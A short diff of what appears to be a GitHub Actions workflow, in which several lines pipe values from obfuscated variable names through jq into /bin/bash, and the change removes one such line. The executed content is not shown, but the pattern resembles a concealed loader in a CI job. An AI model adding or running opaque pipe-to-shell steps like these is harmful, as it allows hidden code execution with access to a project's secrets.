@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$jra90" | jq -r .ruliu60046 | /bin/bash
           echo $uxxf0 | jq -r .bho734 | /bin/bash
           echo $io82068 | jq -r .v816 | /bin/bash
-          echo $bcyo43 | jq -r .m87375 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
